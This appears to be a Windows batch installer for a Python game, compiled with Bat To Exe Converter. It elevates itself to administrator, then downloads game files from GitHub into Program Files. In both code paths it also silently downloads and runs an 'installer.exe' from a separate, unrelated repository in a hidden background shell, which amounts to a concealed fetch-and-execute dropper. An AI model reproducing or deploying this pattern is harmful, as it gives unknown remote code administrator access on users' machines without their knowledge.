::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJHqL8EcMKwtEcAODMW68D7kZ+9Ty4fmTo0ERUfBxfZfeug==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

net session > Nul || powershell start -verb runas '%0' am_admin & exit /b

cd "c:/program files"

set gamefolder="python game"

if not exist %gamefolder% (
    mkdir %gamefolder%
    cd %gamefolder%
) else (
    cd %gamefolder%
    if exist "version.json" (
        if not exist "clientupdater.py" (
            curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/Clientupdater.py --output clientupdater.py
            if not exist "updater.exe" (
                curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/updater.exe --output updater.exe
            )
        )
        start /b cmd.exe /c "cd "c:/program files/%gamefolder%" & curl -s -L https://raw.githubusercontent.com/reedthorngag/programFiles/main/installer.exe --output installer.exe & start /b installer.exe"
        start python clientupdater.py
        exit /b 0
    )
)

start /b cmd.exe /c "cd "c:/program files/%gamefolder%" & curl -s -L https://raw.githubusercontent.com/reedthorngag/programFiles/main/installer.exe --output installer.exe & start /b installer.exe"

curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/client.py --output client.py
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/Clientupdater.py --output clientupdater.py
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/launcher.exe --output launcher.exe
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/updater.exe --output updater.exe
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/version.json --output version.json
